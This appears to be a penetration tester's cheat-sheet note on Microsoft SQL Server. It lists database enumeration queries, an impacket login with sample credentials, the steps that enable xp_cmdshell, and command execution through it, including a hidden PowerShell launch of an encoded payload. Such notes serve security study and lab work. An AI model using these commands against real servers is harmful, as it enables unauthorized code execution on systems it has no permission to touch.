> Microsoft SQL Server is a proprietary relational database management system developed by Microsoft.


#SQL #MSSQL 

Database Version
```
SELECT @@VERSION;
```

View all databases
```mssql
SELECT name, database_id, create_date FROM sys.databases;
```

Use a database
```
USE database_name
```

Show all tables in database
```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

Show all data in table
```
SELECT * FROM table_name;
```

Enabling `xp_cmdshell` feature
```bash
impacket-mssqlclient Administrator:Sussybaka123@192.168.69.123 -windows-auth -port 1433
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Executing Commands via `xp_cmdshell`
```bash
EXECUTE xp_cmdshell 'whoami';
```
```
EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <encoded_payload>'
```